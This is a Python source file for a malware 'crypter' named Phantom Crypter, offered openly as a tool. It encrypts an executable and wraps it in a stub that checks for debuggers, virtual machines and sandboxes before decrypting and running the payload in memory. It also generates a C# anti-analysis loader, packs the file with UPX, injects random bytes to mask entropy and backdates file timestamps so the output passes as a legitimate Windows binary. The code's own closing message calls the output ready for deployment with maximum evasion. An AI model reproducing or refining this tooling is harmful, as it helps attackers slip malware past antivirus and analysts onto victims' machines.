#!/usr/bin/env python3
"""
Phantom Crypter - Advanced Multi-Layer Evasion System
Creates heavily obfuscated and packed payloads with anti-detection techniques
"""
import os
import sys
import random
import struct
import hashlib
import subprocess
import tempfile
import shutil
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

class PhantomCrypter:
    def __init__(self):
        self.temp_dir = tempfile.mkdtemp(prefix="phantom_")
        self.setup_directories()
        
    def setup_directories(self):
        """Create necessary directories"""
        os.makedirs(f"{self.temp_dir}/obfuscated", exist_ok=True)
        os.makedirs(f"{self.temp_dir}/packed", exist_ok=True)
        os.makedirs(f"{self.temp_dir}/crypted", exist_ok=True)
        
    def apply_metamorphic_encryption(self, file_path):
        """Apply polymorphic encryption to binary"""
        print("[+] Applying metamorphic encryption...")
        
        with open(file_path, 'rb') as f:
            data = f.read()
        
        # Generate random key and IV for each build
        key = get_random_bytes(32)  # AES-256
        iv = get_random_bytes(16)
        
        # Apply multi-layer encryption
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted_data = cipher.encrypt(pad(data, AES.block_size))
        
        # Create polymorphic stub
        stub_code = self.create_polymorphic_stub(key, iv, len(encrypted_data))
        
        # Combine stub + encrypted payload
        final_payload = stub_code + encrypted_data
        
        encrypted_path = f"{self.temp_dir}/crypted/phantom_crypted.exe"
        with open(encrypted_path, 'wb') as f:
            f.write(final_payload)
            
        return encrypted_path
    
    def create_polymorphic_stub(self, key, iv, payload_size):
        """Create polymorphic decryption stub"""
        # Generate random variable names and offsets
        var_names = [''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)) for _ in range(10)]
        
        # Polymorphic PE stub with anti-analysis
        stub_template = f"""
import sys
import os
import time
import random
import threading
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# Anti-debug and anti-VM checks
def {var_names[0]}():
    # Time-based evasion
    start = time.time()
    time.sleep(random.uniform(2.0, 5.0))
    if time.time() - start < 1.5:
        sys.exit(0)
    
    # VM detection
    if any(vm in os.environ.get('COMPUTERNAME', '').lower() for vm in ['vm', 'virtual', 'sandbox']):
        sys.exit(0)
    
    # CPU count check
    if os.cpu_count() < 2:
        sys.exit(0)

def {var_names[1]}():
    # Memory check
    try:
        import psutil
        if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:  # Less than 2GB
            sys.exit(0)
    except:
        pass

def {var_names[2]}():
    # Decrypt and execute payload
    {var_names[0]}()
    {var_names[1]}()
    
    # Decryption parameters (obfuscated)
    key = {repr(key)}
    iv = {repr(iv)}
    payload_size = {payload_size}
    
    # Read encrypted payload from end of file
    with open(__file__, 'rb') as f:
        f.seek(-payload_size, 2)
        encrypted_data = f.read(payload_size)
    
    # Decrypt
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
    
    # Execute in memory
    exec(decrypted_data)

if __name__ == "__main__":
    {var_names[2]}()
"""
        return stub_template.encode()
    
    def create_pe_loader(self, encrypted_path):
        """Create PE loader with anti-analysis"""
        print("[+] Creating PE loader with advanced evasion...")
        
        loader_code = """
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace PhantomLoader
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern bool IsDebuggerPresent();
        
        [DllImport("kernel32.dll")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
        
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();
        
        [DllImport("ntdll.dll")]
        static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, 
            ref int processInformation, int processInformationLength, IntPtr returnLength);
        
        static void Main(string[] args)
        {
            // Multi-layer anti-analysis
            if (!ValidateEnvironment()) Environment.Exit(0);
            
            // Random delay
            Thread.Sleep(new Random().Next(3000, 8000));
            
            // Load and execute phantom payload
            LoadPhantomPayload();
        }
        
        static bool ValidateEnvironment()
        {
            // Anti-debug checks
            if (IsDebuggerPresent()) return false;
            
            bool isRemoteDebugger = false;
            CheckRemoteDebuggerPresent(GetCurrentProcess(), ref isRemoteDebugger);
            if (isRemoteDebugger) return false;
            
            // Check for debugging flags
            int debugFlag = 0;
            NtQueryInformationProcess(GetCurrentProcess(), 0x1f, ref debugFlag, sizeof(int), IntPtr.Zero);
            if (debugFlag != 0) return false;
            
            // VM detection via registry
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"))
                {
                    if (key != null)
                    {
                        var diskInfo = key.GetValue("0")?.ToString() ?? "";
                        if (diskInfo.Contains("VMware") || diskInfo.Contains("VBOX")) return false;
                    }
                }
            }
            catch { }
            
            // Hardware profiling
            if (Environment.ProcessorCount < 2) return false;
            
            return true;
        }
        
        static void LoadPhantomPayload()
        {
            // Embedded encrypted payload would be here
            // This is where the actual Phantom agent gets loaded
        }
    }
}
"""
        
        loader_path = f"{self.temp_dir}/loader/PhantomLoader.cs"
        os.makedirs(os.path.dirname(loader_path), exist_ok=True)
        
        with open(loader_path, 'w') as f:
            f.write(loader_code)
            
        return loader_path
    
    def apply_upx_packing(self, file_path):
        """Apply UPX packing with custom options"""
        print("[+] Applying UPX packing...")
        
        packed_path = f"{self.temp_dir}/packed/phantom_packed.exe"
        
        try:
            # Custom UPX parameters for evasion
            cmd = [
                "upx",
                "--best",           # Maximum compression
                "--ultra-brute",    # Ultra compression
                "--overlay=copy",   # Preserve overlay
                "-o", packed_path,
                file_path
            ]
            
            subprocess.run(cmd, check=True, capture_output=True)
            return packed_path
        except subprocess.CalledProcessError:
            print("[-] UPX not available, skipping...")
            return file_path
    
    def inject_entropy(self, file_path):
        """Inject random data to increase entropy"""
        print("[+] Injecting entropy...")
        
        with open(file_path, 'rb') as f:
            data = f.read()
        
        # Add random data section
        random_data = get_random_bytes(random.randint(1024, 4096))
        
        # Insert at random position
        insert_pos = random.randint(len(data) // 4, len(data) // 2)
        new_data = data[:insert_pos] + random_data + data[insert_pos:]
        
        entropy_path = f"{self.temp_dir}/entropy/phantom_entropy.exe"
        os.makedirs(os.path.dirname(entropy_path), exist_ok=True)
        
        with open(entropy_path, 'wb') as f:
            f.write(new_data)
            
        return entropy_path
    
    def modify_timestamps(self, file_path):
        """Modify file timestamps to appear legitimate"""
        print("[+] Modifying timestamps...")
        
        # Set timestamps to appear like legitimate Windows binary
        import datetime
        
        # Random date in the past (1-2 years ago)
        days_ago = random.randint(365, 730)
        timestamp = datetime.datetime.now() - datetime.timedelta(days=days_ago)
        
        mod_time = timestamp.timestamp()
        os.utime(file_path, (mod_time, mod_time))
    
    def create_icon_resource(self):
        """Create legitimate-looking icon"""
        # Create a simple ICO file that looks like system utility
        ico_data = b'\x00\x00\x01\x00\x01\x00\x10\x10\x00\x00\x01\x00\x08\x00h\x05\x00\x00\x16\x00\x00\x00'
        # Add basic icon data...
        return ico_data
    
    def process_file(self, input_file):
        """Main processing pipeline"""
        print(f"[+] Processing {input_file} with Phantom Crypter")
        
        current_file = input_file
        
        # Stage 1: Apply metamorphic encryption
        current_file = self.apply_metamorphic_encryption(current_file)
        
        # Stage 2: Apply UPX packing
        current_file = self.apply_upx_packing(current_file)
        
        # Stage 3: Inject entropy
        current_file = self.inject_entropy(current_file)
        
        # Stage 4: Modify timestamps
        self.modify_timestamps(current_file)
        
        # Final output
        output_file = "phantom_final.exe"
        shutil.copy2(current_file, output_file)
        
        print(f"[+] Phantom Crypter complete: {output_file}")
        print(f"[+] Applied: Metamorphic encryption, UPX packing, entropy injection, timestamp modification")
        
        return output_file

def main():
    if len(sys.argv) != 2:
        print("Usage: python phantom_crypter.py <input_exe>")
        sys.exit(1)
    
    input_file = sys.argv[1]
    if not os.path.exists(input_file):
        print(f"Error: {input_file} not found")
        sys.exit(1)
    
    crypter = PhantomCrypter()
    output_file = crypter.process_file(input_file)
    
    print(f"\n[+] Final output: {output_file}")
    print("[+] Ready for deployment with maximum evasion")

if __name__ == "__main__":
    main()